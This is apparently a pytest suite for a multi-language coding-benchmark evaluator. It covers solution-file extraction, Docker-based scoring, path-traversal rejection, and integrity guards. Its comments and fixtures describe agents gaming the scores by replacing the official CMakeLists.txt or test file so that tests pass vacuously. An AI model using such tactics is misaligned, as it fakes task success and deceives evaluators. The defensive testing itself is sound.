"""Tests for kcsi.benchmarks.polyglot_harness — extraction and evaluator."""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import tempfile
from pathlib import Path

import pytest

import kcsi.benchmarks.polyglot_harness as polyglot_harness
from kcsi.benchmarks.polyglot_harness import (
    PolyglotHarnessEvaluator,
    _polyglot_environment_metadata,
    _restore_host_ownership,
    _safe_write,
    _validate_safe_path,
    _validate_test_command,
    extract_solution_files,
)
from kcsi.models import TaskSpec

# -----------------------------------------------------------------------
# extract_solution_files
# -----------------------------------------------------------------------


class TestExtractSolutionFiles:
    """Unit tests for extract_solution_files."""

    def test_single_named_file_slash_comment(self):
        output = (
            "Here is the solution:\n```python\n// file: poker.py\ndef best_hands(hands):\n    return hands[:1]\n```\n"
        )
        result = extract_solution_files(output, language="python")
        assert result == {
            "poker.py": "def best_hands(hands):\n    return hands[:1]",
        }

    def test_single_named_file_hash_comment(self):
        output = "```python\n# file: solver.py\nx = 42\n```\n"
        result = extract_solution_files(output, language="python")
        assert result == {"solver.py": "x = 42"}

    def test_multiple_named_files(self):
        output = (
            "```rust\n"
            "// file: src/lib.rs\n"
            "pub fn add(a: i32, b: i32) -> i32 { a + b }\n"
            "```\n"
            "\n"
            "```rust\n"
            "// file: src/helper.rs\n"
            "pub fn noop() {}\n"
            "```\n"
        )
        result = extract_solution_files(output, language="rust")
        assert len(result) == 2
        assert "src/lib.rs" in result
        assert "src/helper.rs" in result
        assert "pub fn add" in result["src/lib.rs"]

    def test_fallback_uses_default_filename(self):
        output = "```python\ndef solve():\n    return 1\n```\n"
        result = extract_solution_files(output, language="python")
        assert "solution.py" in result
        assert "def solve" in result["solution.py"]

    def test_fallback_picks_last_block(self):
        output = (
            "```python\ndef long_function():\n    a = 1\n    b = 2\n    return a + b\n```\n\n```python\nx = 1\n```\n"
        )
        result = extract_solution_files(output, language="python")
        assert "solution.py" in result
        # The last block should win (agents refine iteratively)
        assert "x = 1" in result["solution.py"]

    def test_no_code_blocks_returns_empty(self):
        output = "I could not solve this problem, sorry."
        result = extract_solution_files(output, language="python")
        assert result == {}

    def test_fence_tag_aliases(self):
        """``py`` tag should match ``python`` language."""
        output = "```py\nanswer = 42\n```\n"
        result = extract_solution_files(output, language="python")
        assert "solution.py" in result
        assert "answer = 42" in result["solution.py"]

    def test_go_default_filename(self):
        output = "```go\npackage main\n```\n"
        result = extract_solution_files(output, language="go")
        assert "solution.go" in result

    def test_javascript_default_filename(self):
        output = "```js\nmodule.exports = {};\n```\n"
        result = extract_solution_files(output, language="javascript")
        assert "solution.js" in result


# -----------------------------------------------------------------------
# _solution_files_from_workspace
# -----------------------------------------------------------------------


def test_solution_files_from_workspace_excludes_test_and_build_files_on_retry_round(tmp_path):
    """The mid-loop barrier callback's runtime_meta must resolve to a repo dir
    whose _solution_files_from_workspace call still excludes test_files/build_files
    -- this must hold on EVERY retry round, not just attempt 1."""
    from kcsi.benchmarks.polyglot_harness import _solution_files_from_workspace

    workspace_dir = tmp_path / "ws"
    workspace_dir.mkdir()
    (workspace_dir / "bowling.py").write_text("def score(): pass\n")
    (workspace_dir / "bowling_test.py").write_text("def test_score(): assert score() == 0\n")

    task = TaskSpec(
        id="python__bowling",
        repo="",
        prompt="",
        metadata={
            "task_source": "polyglot",
            "language": "python",
            "exercise_name": "bowling",
            "starter_code": {"bowling.py": "def score(): pass\n"},
            "test_files": {"bowling_test.py": "def test_score(): assert score() == 0\n"},
            "build_files": {},
        },
    )

    files = _solution_files_from_workspace(
        task=task,
        language="python",
        runtime_meta={"host_workspace_repo_dir": str(workspace_dir)},
    )

    assert "bowling.py" in files
    assert "bowling_test.py" not in files


# -----------------------------------------------------------------------
# PolyglotHarnessEvaluator (skip_docker=True)
# -----------------------------------------------------------------------


class TestPolyglotHarnessEvaluator:
    """Tests with skip_docker=True — no Docker required."""

    def _make_task(self, task_id: str = "two-fer", language: str = "python") -> TaskSpec:
        return TaskSpec(
            id=task_id,
            prompt="Solve two-fer",
            metadata={"language": language},
        )

    def test_evaluate_returns_expected_keys(self):
        ev = PolyglotHarnessEvaluator(skip_docker=True)
        task = self._make_task()
        result = ev.evaluate(
            task=task,
            model_output="```python\ndef two_fer(name='you'):\n    return f'One for {name}, one for me.'\n```\n",
        )
        for key in ("status", "instance_id", "native_score", "resolved"):
            assert key in result, f"Missing key: {key}"
        assert result["instance_id"] == "two-fer"

    def test_no_solution_returns_zero_score(self):
        ev = PolyglotHarnessEvaluator(skip_docker=True)
        task = self._make_task()
        result = ev.evaluate(task=task, model_output="I don't know.")
        assert result["status"] == "no_solution"
        assert result["native_score"] == 0.0
        assert result["resolved"] is False

    def test_skip_docker_lists_extracted_files(self):
        ev = PolyglotHarnessEvaluator(skip_docker=True)
        task = self._make_task()
        output = (
            "```python\n// file: two_fer.py\ndef two_fer(name='you'):\n    return f'One for {name}, one for me.'\n```\n"
        )
        result = ev.evaluate(task=task, model_output=output)
        assert result["status"] == "skip_docker"
        assert "two_fer.py" in result["extracted_files"]
        assert "polyglot_environment" not in result

    def test_workspace_solution_files_fallback(self):
        ev = PolyglotHarnessEvaluator(skip_docker=True)
        task = TaskSpec(
            id="two-fer",
            prompt="Solve two-fer",
            metadata={
                "language": "python",
                "starter_code": {"solution.py": "def two_fer(name='you'):\n    pass\n"},
            },
        )

        result = ev.evaluate(
            task=task,
            model_output="",
            runtime_meta={
                "workspace_solution_files": {
                    "solution.py": "def two_fer(name='you'):\n    return f'One for {name}, one for me.'\n"
                }
            },
        )

        assert result["status"] == "skip_docker"
        assert result["solution_source"] == "workspace_files"
        assert result["extracted_files"] == ["solution.py"]

    def test_workspace_solution_files_win_over_stale_model_output(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Workspace-edited files must take precedence over a stale fenced
        block in model_output. This is the polyglot mirror of the SWE-bench Pro
        fix in PR #558: the agent edits files in place via Edit/Write, so the
        workspace is canonical even when an earlier-draft fenced block leaks
        into the final assistant message."""
        ev = PolyglotHarnessEvaluator(skip_docker=True)
        task = TaskSpec(
            id="two-fer",
            prompt="Solve two-fer",
            metadata={"language": "python"},
        )

        canonical = "def two_fer(name='you'):\n    return f'One for {name}, one for me.'\n"
        stale = "def two_fer(name='you'):\n    return None  # earlier draft\n"
        result = ev.evaluate(
            task=task,
            model_output=f"Here was an earlier attempt:\n```python\n{stale}```\n",
            runtime_meta={"workspace_solution_files": {"solution.py": canonical}},
        )

        assert result["status"] == "skip_docker"
        assert result["solution_source"] == "workspace_files"
        # Critical: scoring uses the canonical workspace file, NOT the stale
        # fenced block from model_output.
        assert "earlier draft" not in str(result.get("extracted_files", []))

    def test_model_output_used_when_workspace_files_absent(self) -> None:
        """When the runtime did not capture any workspace files (e.g. agent
        never wrote to disk), fall back to extracting fenced blocks from
        model_output. This preserves the pre-fix behaviour for that path."""
        ev = PolyglotHarnessEvaluator(skip_docker=True)
        task = TaskSpec(
            id="two-fer",
            prompt="Solve two-fer",
            metadata={"language": "python"},
        )

        result = ev.evaluate(
            task=task,
            model_output="```python\ndef two_fer(name='you'):\n    return f'One for {name}, one for me.'\n```\n",
            runtime_meta={},
        )

        assert result["status"] == "skip_docker"
        assert result["solution_source"] == "model_output"

    def test_language_from_metadata(self):
        ev = PolyglotHarnessEvaluator(skip_docker=True)
        task = self._make_task(language="rust")
        output = "```rust\npub fn answer() -> i32 { 42 }\n```\n"
        result = ev.evaluate(task=task, model_output=output)
        assert result["language"] == "rust"
        assert result["status"] == "skip_docker"

    def test_real_results_cache_polyglot_environment_by_image_id(self, monkeypatch: pytest.MonkeyPatch):
        calls: list[list[str]] = []

        def fake_run(cmd: list[str], **kwargs):
            calls.append(cmd)
            if cmd[:3] == ["docker", "image", "inspect"]:
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout=(
                        '{"Id":"sha256:abc123",'
                        '"RepoDigests":["kcsi-polyglot-eval@sha256:def456"],'
                        '"Config":{"Labels":{'
                        '"org.knowledgecentric.polyglot.recipe":"polyglot-hyperagents-base-20260422-rust-pin",'
                        '"org.knowledgecentric.polyglot.recipe_base_image":"buildpack-deps:jammy",'
                        '"org.knowledgecentric.polyglot.recipe_source":"'
                        'baselines/hyperagents/domains/polyglot/dockerfiles.py:_DOCKERFILE_BASE"'
                        "}}}\n"
                    ),
                    stderr="",
                )
            if cmd[:4] == ["docker", "run", "--rm", "poly-img"]:
                stdout = "\n".join(
                    [
                        "python=Python 3.11.15",
                        "go=go version go1.21.5 linux/amd64",
                        "node=v20.20.2",
                        'java=openjdk version "21.0.10" 2026-01-20',
                        "conda=conda 23.11.0",
                    ]
                )
                return subprocess.CompletedProcess(cmd, 0, stdout=stdout, stderr="")
            raise AssertionError(f"unexpected subprocess call: {cmd}")

        _polyglot_environment_metadata.cache_clear()
        monkeypatch.setattr(polyglot_harness.subprocess, "run", fake_run)

        ev = PolyglotHarnessEvaluator(docker_image="poly-img")
        task = self._make_task()
        result = ev.evaluate(task=task, model_output="no code")
        second = ev.evaluate(task=task, model_output="still no code")

        env = result["polyglot_environment"]
        assert env["runner"] == "kcsi"
        assert env["docker_image"] == "poly-img"
        assert env["docker_image_id"] == "sha256:abc123"
        assert env["docker_repo_digests"] == ["kcsi-polyglot-eval@sha256:def456"]
        assert env["recipe"] == "polyglot-hyperagents-base-20260422-rust-pin"
        assert env["recipe_base_image"] == "buildpack-deps:jammy"
        assert env["recipe_source"] == "baselines/hyperagents/domains/polyglot/dockerfiles.py:_DOCKERFILE_BASE"
        assert env["tool_versions"]["python"] == "Python 3.11.15"
        assert env["tool_versions"]["go"] == "go version go1.21.5 linux/amd64"
        assert second["polyglot_environment"] == env
        assert [cmd[:3] for cmd in calls].count(["docker", "image", "inspect"]) == 2
        assert [cmd[:3] for cmd in calls].count(["docker", "run", "--rm"]) == 1

    def test_polyglot_environment_cache_refreshes_when_tag_id_changes(self, monkeypatch: pytest.MonkeyPatch):
        image_ids = iter(["sha256:first", "sha256:second"])
        run_count = 0

        def fake_run(cmd: list[str], **kwargs):
            nonlocal run_count
            if cmd[:3] == ["docker", "image", "inspect"]:
                image_id = next(image_ids)
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout=f'{{"Id":"{image_id}","Config":{{"Labels":{{}}}}}}\n',
                    stderr="",
                )
            if cmd[:4] == ["docker", "run", "--rm", "poly-img"]:
                run_count += 1
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout=f"python=Python 3.11.{run_count}\n",
                    stderr="",
                )
            raise AssertionError(f"unexpected subprocess call: {cmd}")

        _polyglot_environment_metadata.cache_clear()
        monkeypatch.setattr(polyglot_harness.subprocess, "run", fake_run)

        ev = PolyglotHarnessEvaluator(docker_image="poly-img")
        task = self._make_task()
        first = ev.evaluate(task=task, model_output="no code")
        second = ev.evaluate(task=task, model_output="still no code")

        assert first["polyglot_environment"]["docker_image_id"] == "sha256:first"
        assert first["polyglot_environment"]["docker_repo_digests"] == []
        assert second["polyglot_environment"]["docker_image_id"] == "sha256:second"
        assert second["polyglot_environment"]["docker_repo_digests"] == []
        assert run_count == 2
        assert "recipe_base_image" not in second["polyglot_environment"]

    def test_default_test_command(self):
        assert "pytest" in PolyglotHarnessEvaluator._default_test_command("python")
        assert "cargo test" in PolyglotHarnessEvaluator._default_test_command("rust")
        assert "go test" in PolyglotHarnessEvaluator._default_test_command("go")
        assert "npm" in PolyglotHarnessEvaluator._default_test_command("javascript")
        assert "gradle" in PolyglotHarnessEvaluator._default_test_command("java")
        assert "cmake" in PolyglotHarnessEvaluator._default_test_command("cpp")

    def test_existing_absolute_starter_code_path_rejected_before_docker(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ):
        external = tmp_path / "outside.py"
        external.write_text("outside", encoding="utf-8")

        def fail_run(*_args, **_kwargs):
            raise AssertionError("docker should not run for unsafe starter_code path")

        monkeypatch.setattr(polyglot_harness.subprocess, "run", fail_run)
        ev = PolyglotHarnessEvaluator(docker_image="poly-img")
        task = TaskSpec(
            id="two-fer",
            prompt="Solve two-fer",
            metadata={
                "language": "python",
                "starter_code": {str(external): "should not be accepted"},
            },
        )

        with pytest.raises(ValueError, match="path traversal"):
            ev.evaluate(task=task, model_output="```python\n# file: solution.py\nx = 1\n```\n")

    def test_timeout_reaps_named_docker_container(self, monkeypatch: pytest.MonkeyPatch):
        calls: list[list[str]] = []

        def fake_environment_metadata(_docker_image: str) -> dict[str, str]:
            return {}

        def fake_run(cmd: list[str], **kwargs):
            calls.append(cmd)
            if cmd[:3] == ["docker", "run", "--rm"]:
                raise subprocess.TimeoutExpired(cmd=cmd, timeout=kwargs.get("timeout"))
            if cmd[:3] == ["docker", "rm", "-f"]:
                return subprocess.CompletedProcess(cmd, 0, stdout="removed\n", stderr="")
            raise AssertionError(f"unexpected subprocess call: {cmd}")

        monkeypatch.setattr(polyglot_harness, "_polyglot_environment_metadata", fake_environment_metadata)
        monkeypatch.setattr(polyglot_harness.subprocess, "run", fake_run)

        ev = PolyglotHarnessEvaluator(docker_image="poly-img", timeout_sec=7)
        task = self._make_task(task_id="python__two-fer")
        result = ev.evaluate(task=task, model_output="```python\nx = 1\n```\n")

        docker_run = calls[0]
        container_name = docker_run[docker_run.index("--name") + 1]
        labels = [docker_run[idx + 1] for idx, part in enumerate(docker_run[:-1]) if part == "--label"]
        assert "org.knowledgecentric.kcsi.eval=polyglot" in labels
        # Historical MockingJay-era alias stays for external cleanup tooling.
        assert "org.mockingjay.swarms.eval=polyglot" in labels
        assert result["status"] == "timeout"
        assert result["cleanup_attempted"] is True
        assert result["cleanup_container"] == container_name
        assert result["cleanup_status"] == "ok"
        assert ["docker", "rm", "-f", container_name] in calls

    def test_setup_failure_reported_as_distinct_status(self, monkeypatch: pytest.MonkeyPatch):
        """A nonzero setup-step exit (e.g. `npm install` hitting a transient
        registry error) must be distinguishable from a genuine test failure
        (issue #1042): both used to collapse into status="ok"/native_score=0.0
        via the chained `setup && test` command's single returncode."""

        def fake_environment_metadata(_docker_image: str) -> dict[str, str]:
            return {}

        def fake_run(cmd: list[str], **kwargs):
            if cmd[:3] == ["docker", "run", "--rm"]:
                full_cmd = cmd[-1]
                # The harness must wrap the setup step so a real bash failure
                # there emits the marker -- sanity-check the command is wired
                # up for the language under test, not hardcoded around it.
                assert "npm install" in full_cmd
                assert polyglot_harness._SETUP_FAILURE_MARKER in full_cmd
                return subprocess.CompletedProcess(
                    cmd,
                    97,
                    stdout="",
                    stderr=f"npm ERR! registry unreachable\n{polyglot_harness._SETUP_FAILURE_MARKER}\n",
                )
            raise AssertionError(f"unexpected subprocess call: {cmd}")

        monkeypatch.setattr(polyglot_harness, "_polyglot_environment_metadata", fake_environment_metadata)
        monkeypatch.setattr(polyglot_harness.subprocess, "run", fake_run)

        ev = PolyglotHarnessEvaluator(docker_image="poly-img")
        task = self._make_task(task_id="javascript__two-fer", language="javascript")
        result = ev.evaluate(
            task=task,
            model_output="```javascript\n// file: two-fer.js\nmodule.exports = () => {};\n```\n",
        )

        assert result["status"] == "setup_failed"
        assert result["native_score"] == 0.0
        assert result["resolved"] is False

    def test_genuine_test_failure_after_successful_setup_still_scores_ok_zero(self, monkeypatch: pytest.MonkeyPatch):
        """Regression guard: when setup succeeds and only the test fails, the
        result must still be status="ok"/native_score=0.0 -- the setup_failed
        gate must not swallow genuine test failures."""

        def fake_environment_metadata(_docker_image: str) -> dict[str, str]:
            return {}

        def fake_run(cmd: list[str], **kwargs):
            if cmd[:3] == ["docker", "run", "--rm"]:
                return subprocess.CompletedProcess(cmd, 1, stdout="1 failing\n", stderr="AssertionError\n")
            raise AssertionError(f"unexpected subprocess call: {cmd}")

        monkeypatch.setattr(polyglot_harness, "_polyglot_environment_metadata", fake_environment_metadata)
        monkeypatch.setattr(polyglot_harness.subprocess, "run", fake_run)

        ev = PolyglotHarnessEvaluator(docker_image="poly-img")
        task = self._make_task(task_id="javascript__two-fer", language="javascript")
        result = ev.evaluate(
            task=task,
            model_output="```javascript\n// file: two-fer.js\nmodule.exports = () => {};\n```\n",
        )

        assert result["status"] == "ok"
        assert result["native_score"] == 0.0
        assert result["resolved"] is False

    def test_output_tails_contain_full_last_50_lines(self, monkeypatch: pytest.MonkeyPatch):
        """The test-feedback loop documents delivering the last 50 LINES of
        official runner output (``--polyglot-test-feedback-max-lines``); the
        harness-side char cap must be generous enough that 50 long lines
        (gradle stack frames, jest diffs) survive it. Regression guard for
        the old ``[-2000:]`` cap, which held only ~15-25 gradle lines."""
        # 120 lines x ~100 chars = ~12k chars; the last 50 lines alone are
        # ~5k chars, well over the old 2000-char cap.
        stdout_lines = [f"stdout line {i:04d} " + "x" * 90 for i in range(120)]
        stderr_lines = [f"stderr at frame {i:04d} " + "y" * 90 for i in range(120)]
        stdout = "\n".join(stdout_lines) + "\n"
        stderr = "\n".join(stderr_lines) + "\n"

        def fake_environment_metadata(_docker_image: str) -> dict[str, str]:
            return {}

        def fake_run(cmd: list[str], **kwargs):
            if cmd[:3] == ["docker", "run", "--rm"]:
                return subprocess.CompletedProcess(cmd, 1, stdout=stdout, stderr=stderr)
            raise AssertionError(f"unexpected subprocess call: {cmd}")

        monkeypatch.setattr(polyglot_harness, "_polyglot_environment_metadata", fake_environment_metadata)
        monkeypatch.setattr(polyglot_harness.subprocess, "run", fake_run)

        ev = PolyglotHarnessEvaluator(docker_image="poly-img")
        task = self._make_task(task_id="javascript__two-fer", language="javascript")
        result = ev.evaluate(
            task=task,
            model_output="```javascript\n// file: two-fer.js\nmodule.exports = () => {};\n```\n",
        )

        # The full last 50 lines must survive the harness-side cap so the
        # TS-side extractCappedTail(text, 50) sees genuine lines, not a
        # char-truncated fragment.
        assert "\n".join(stdout_lines[-50:]) in result["test_stdout_tail"]
        assert "\n".join(stderr_lines[-50:]) in result["test_stderr_tail"]

    def test_output_tails_remain_char_capped_for_pathological_output(self, monkeypatch: pytest.MonkeyPatch):
        """The cap is raised, not removed: a pathological run emitting far
        more than 50 long lines' worth of output must still be truncated to
        the safety cap so eval_result payloads stay bounded."""
        stdout = "z" * 100_000  # single pathological blob, no newlines

        def fake_environment_metadata(_docker_image: str) -> dict[str, str]:
            return {}

        def fake_run(cmd: list[str], **kwargs):
            if cmd[:3] == ["docker", "run", "--rm"]:
                return subprocess.CompletedProcess(cmd, 1, stdout=stdout, stderr="")
            raise AssertionError(f"unexpected subprocess call: {cmd}")

        monkeypatch.setattr(polyglot_harness, "_polyglot_environment_metadata", fake_environment_metadata)
        monkeypatch.setattr(polyglot_harness.subprocess, "run", fake_run)

        ev = PolyglotHarnessEvaluator(docker_image="poly-img")
        task = self._make_task(task_id="javascript__two-fer", language="javascript")
        result = ev.evaluate(
            task=task,
            model_output="```javascript\n// file: two-fer.js\nmodule.exports = () => {};\n```\n",
        )

        cap = polyglot_harness._TEST_OUTPUT_TAIL_CHARS
        assert cap == 20_000
        assert result["test_stdout_tail"] == stdout[-cap:]
        assert len(result["test_stdout_tail"]) == cap

    def test_setup_failed_output_tails_contain_full_last_50_lines(self, monkeypatch: pytest.MonkeyPatch):
        """Same 50-line guarantee for the setup_failed branch, whose tails
        are produced by a separate _result call."""
        stderr_lines = [f"npm ERR! frame {i:04d} " + "e" * 90 for i in range(120)]
        stderr = "\n".join(stderr_lines) + f"\n{polyglot_harness._SETUP_FAILURE_MARKER}\n"

        def fake_environment_metadata(_docker_image: str) -> dict[str, str]:
            return {}

        def fake_run(cmd: list[str], **kwargs):
            if cmd[:3] == ["docker", "run", "--rm"]:
                return subprocess.CompletedProcess(cmd, 97, stdout="", stderr=stderr)
            raise AssertionError(f"unexpected subprocess call: {cmd}")

        monkeypatch.setattr(polyglot_harness, "_polyglot_environment_metadata", fake_environment_metadata)
        monkeypatch.setattr(polyglot_harness.subprocess, "run", fake_run)

        ev = PolyglotHarnessEvaluator(docker_image="poly-img")
        task = self._make_task(task_id="javascript__two-fer", language="javascript")
        result = ev.evaluate(
            task=task,
            model_output="```javascript\n// file: two-fer.js\nmodule.exports = () => {};\n```\n",
        )

        assert result["status"] == "setup_failed"
        assert "\n".join(stderr_lines[-50:]) in result["test_stderr_tail"]


# -----------------------------------------------------------------------
# Java @Disabled annotation removal
# -----------------------------------------------------------------------


class TestJavaDisabledRemoval:
    """Verify that Java @Disabled annotations are stripped from test files."""

    # The regex used in polyglot_harness._run_in_docker
    _DISABLED_RE = re.compile(r"@Disabled(?:\(\"[^\"]*\"\))?\s*\n")

    def _strip(self, content: str) -> str:
        return self._DISABLED_RE.sub("", content)

    def test_removes_disabled_with_message(self):
        content = '@Disabled("Remove to run")\n    @Test\n    public void test() {}\n'
        result = self._strip(content)
        assert "@Disabled" not in result
        assert "@Test" in result

    def test_removes_disabled_with_different_message(self):
        content = '@Disabled("Remove to run test")\n    @Test\n    public void test() {}\n'
        result = self._strip(content)
        assert "@Disabled" not in result
        assert "@Test" in result

    def test_removes_bare_disabled(self):
        content = "@Disabled\n    @Test\n    public void test() {}\n"
        result = self._strip(content)
        assert "@Disabled" not in result
        assert "@Test" in result

    def test_preserves_import(self):
        content = "import org.junit.jupiter.api.Disabled;\n@Disabled\n@Test\n"
        result = self._strip(content)
        assert "import org.junit.jupiter.api.Disabled;" in result
        assert result.count("@Disabled") == 0

    def test_full_java_test_file(self):
        content = (
            "import org.junit.jupiter.api.Disabled;\n"
            "import org.junit.jupiter.api.Test;\n"
            "\n"
            "public class ReactTest {\n"
            "    @Test\n"
            "    public void testFirst() {}\n"
            "\n"
            '    @Disabled("Remove to run")\n'
            "    @Test\n"
            "    public void testSecond() {}\n"
            "\n"
            '    @Disabled("Remove to run test")\n'
            "    @Test\n"
            "    public void testThird() {}\n"
            "}\n"
        )
        result = self._strip(content)
        assert result.count("@Test") == 3
        assert "@Disabled" not in result
        # The first test should be unchanged
        assert "    @Test\n    public void testFirst() {}" in result
        # Second and third should have @Test preserved
        assert "    @Test\n    public void testSecond() {}" in result
        assert "    @Test\n    public void testThird() {}" in result

    def test_evaluator_writes_cleaned_java_tests(self):
        """Integration: evaluator with skip_docker strips @Disabled from Java test files."""
        ev = PolyglotHarnessEvaluator(skip_docker=True)
        task = TaskSpec(
            id="java__react",
            prompt="Solve react",
            metadata={
                "language": "java",
                "test_files": {
                    "src/test/java/ReactTest.java": (
                        "import org.junit.jupiter.api.Disabled;\n"
                        "@Test\npublic void first() {}\n"
                        '@Disabled("Remove to run")\n'
                        "@Test\npublic void second() {}\n"
                    ),
                },
            },
        )
        # skip_docker doesn't write files, but we can at least verify the
        # evaluator accepts Java tasks without error
        result = ev.evaluate(
            task=task,
            model_output=("```java\n// file: src/main/java/React.java\npublic class React {}\n```\n"),
        )
        assert result["status"] == "skip_docker"
        assert result["language"] == "java"


# -----------------------------------------------------------------------
# Protected official files: solution files must never overwrite official
# test_files / build_files (eval-integrity: agent-supplied CMakeLists.txt
# replacing the official build vacuously passed via "No tests were found!!!")
# -----------------------------------------------------------------------


class TestProtectedOfficialFiles:
    """Solution files colliding with official test/build files are dropped."""

    def _cpp_task(self) -> TaskSpec:
        return TaskSpec(
            id="cpp__diamond",
            prompt="Solve diamond",
            metadata={
                "language": "cpp",
                "exercise_name": "diamond",
                "test_files": {"diamond_test.cpp": "// official test\n"},
                "build_files": {"CMakeLists.txt": "# official build\n"},
            },
        )

    def test_build_file_in_workspace_solution_dropped_with_warning(self, caplog: pytest.LogCaptureFixture):
        """Characterization: solution dict with CMakeLists.txt + a real source
        file -> CMakeLists.txt dropped (with warning), source file kept."""
        ev = PolyglotHarnessEvaluator(skip_docker=True)
        with caplog.at_level("WARNING", logger="kcsi.benchmarks.polyglot_harness"):
            result = ev.evaluate(
                task=self._cpp_task(),
                model_output="",
                runtime_meta={
                    "workspace_solution_files": {
                        "CMakeLists.txt": "add_library(diamond diamond.cpp)\n",
                        "diamond.cpp": "// real source\n",
                    }
                },
            )
        assert result["status"] == "skip_docker"
        assert result["extracted_files"] == ["diamond.cpp"]
        warnings = [r.getMessage() for r in caplog.records if r.levelname == "WARNING"]
        assert any("CMakeLists.txt" in w for w in warnings)

    def test_test_file_in_model_output_solution_dropped(self, caplog: pytest.LogCaptureFixture):
        """The model_output extraction path must also be covered: an agent
        answer shipping its own copy of the official test file is dropped."""
        ev = PolyglotHarnessEvaluator(skip_docker=True)
        output = (
            "```cpp\n// file: diamond_test.cpp\n// self-passing test\n```\n"
            "```cpp\n// file: diamond.cpp\n// real source\n```\n"
        )
        with caplog.at_level("WARNING", logger="kcsi.benchmarks.polyglot_harness"):
            result = ev.evaluate(task=self._cpp_task(), model_output=output)
        assert result["status"] == "skip_docker"
        assert result["extracted_files"] == ["diamond.cpp"]
        warnings = [r.getMessage() for r in caplog.records if r.levelname == "WARNING"]
        assert any("diamond_test.cpp" in w for w in warnings)

    def test_normalized_path_collision_dropped(self):
        """`./CMakeLists.txt` collides with `CMakeLists.txt` on disk (both
        resolve to the same path in _safe_write) and must be dropped too."""
        ev = PolyglotHarnessEvaluator(skip_docker=True)
        result = ev.evaluate(
            task=self._cpp_task(),
            model_output="",
            runtime_meta={
                "workspace_solution_files": {
                    "./CMakeLists.txt": "add_library(diamond diamond.cpp)\n",
                    "diamond.cpp": "// real source\n",
                }
            },
        )
        assert result["extracted_files"] == ["diamond.cpp"]

    def test_all_solution_files_protected_yields_no_solution(self):
        ev = PolyglotHarnessEvaluator(skip_docker=True)
        result = ev.evaluate(
            task=self._cpp_task(),
            model_output="",
            runtime_meta={"workspace_solution_files": {"CMakeLists.txt": "add_library(x)\n"}},
        )
        assert result["status"] == "no_solution"
        assert result["resolved"] is False
        # solution_source reports the drop honestly, not the pre-drop source.
        assert result["solution_source"] == "all_files_protected"

    def test_official_build_file_reaches_docker_tmpdir_intact(self, monkeypatch: pytest.MonkeyPatch):
        """End-to-end through _run_in_docker: the file written on disk at
        docker-run time must be the OFFICIAL CMakeLists.txt, not the agent's."""
        seen: dict[str, str] = {}

        def fake_environment_metadata(_docker_image: str) -> dict[str, str]:
            return {}

        def fake_run(cmd: list[str], **kwargs):
            if cmd[:3] == ["docker", "run", "--rm"]:
                mount = next(part for part in cmd if part.endswith(":/work/diamond"))
                tmpdir = Path(mount.split(":")[0])
                for p in tmpdir.rglob("*"):
                    if p.is_file():
                        seen[str(p.relative_to(tmpdir))] = p.read_text(encoding="utf-8")
                return subprocess.CompletedProcess(cmd, 0, stdout="All tests passed\n", stderr="")
            raise AssertionError(f"unexpected subprocess call: {cmd}")

        monkeypatch.setattr(polyglot_harness, "_polyglot_environment_metadata", fake_environment_metadata)
        monkeypatch.setattr(polyglot_harness.subprocess, "run", fake_run)

        ev = PolyglotHarnessEvaluator(docker_image="poly-img")
        result = ev.evaluate(
            task=self._cpp_task(),
            model_output="",
            runtime_meta={
                "workspace_solution_files": {
                    "CMakeLists.txt": "add_library(diamond diamond.cpp)\n",
                    "diamond.cpp": "// real source\n",
                }
            },
        )
        assert result["status"] == "ok"
        assert seen["CMakeLists.txt"] == "# official build\n"
        assert seen["diamond.cpp"] == "// real source\n"
        assert seen["diamond_test.cpp"] == "// official test\n"


# -----------------------------------------------------------------------
# cpp vacuous-pass guard: ctest exits 0 when zero tests are registered.
# Official Exercism cpp builds run the Catch2 binary at BUILD time
# (add_custom_target(... COMMAND ${exercise})), so a legit pass prints
# "All tests passed (" on stdout while ctest still prints
# "No tests were found!!!" on stderr. A pass with the ctest marker but NO
# Catch2 success marker means nothing was actually tested.
# -----------------------------------------------------------------------


class TestCppVacuousPassGuard:
    def _evaluate_with_streams(
        self, monkeypatch: pytest.MonkeyPatch, *, stdout: str, stderr: str, language: str = "cpp"
    ) -> dict:
        def fake_environment_metadata(_docker_image: str) -> dict[str, str]:
            return {}

        def fake_run(cmd: list[str], **kwargs):
            if cmd[:3] == ["docker", "run", "--rm"]:
                return subprocess.CompletedProcess(cmd, 0, stdout=stdout, stderr=stderr)
            raise AssertionError(f"unexpected subprocess call: {cmd}")

        monkeypatch.setattr(polyglot_harness, "_polyglot_environment_metadata", fake_environment_metadata)
        monkeypatch.setattr(polyglot_harness.subprocess, "run", fake_run)

        ev = PolyglotHarnessEvaluator(docker_image="poly-img")
        task = TaskSpec(
            id=f"{language}__diamond",
            prompt="",
            metadata={"language": language, "exercise_name": "diamond"},
        )
        return ev.evaluate(
            task=task,
            model_output="",
            runtime_meta={"workspace_solution_files": {"diamond.cpp": "// src\n"}},
        )

    def test_vacuous_cpp_pass_scored_zero(self, monkeypatch: pytest.MonkeyPatch):
        """Exit 0 + ctest 'No tests were found!!!' + no Catch2 success marker
        = nothing was tested; must not count as resolved."""
        result = self._evaluate_with_streams(
            monkeypatch,
            stdout="[100%] Built target diamond\nTest project /work/diamond/build\n",
            stderr="No tests were found!!!\n",
        )
        assert result["status"] == "ok"
        assert result["resolved"] is False
        assert result["native_score"] == 0.0
        assert result["cpp_vacuous_pass_guard"] is True

    def test_legit_cpp_pass_not_flagged(self, monkeypatch: pytest.MonkeyPatch):
        """Real passes also print the ctest marker (empirically verified) but
        carry the build-step Catch2 success line -- must stay resolved."""
        result = self._evaluate_with_streams(
            monkeypatch,
            stdout=(
                "[100%] Built target diamond\n"
                "All tests passed (5 assertions in 5 test cases)\n"
                "[100%] Built target test_diamond\nTest project /work/diamond/build\n"
            ),
            stderr="No tests were found!!!\n",
        )
        assert result["status"] == "ok"
        assert result["resolved"] is True
        assert result["native_score"] == 1.0
        assert "cpp_vacuous_pass_guard" not in result

    def test_non_cpp_pass_unaffected_by_marker(self, monkeypatch: pytest.MonkeyPatch):
        result = self._evaluate_with_streams(
            monkeypatch,
            stdout="ok\n",
            stderr="No tests were found!!!\n",
            language="python",
        )
        assert result["resolved"] is True
        assert "cpp_vacuous_pass_guard" not in result


# -----------------------------------------------------------------------
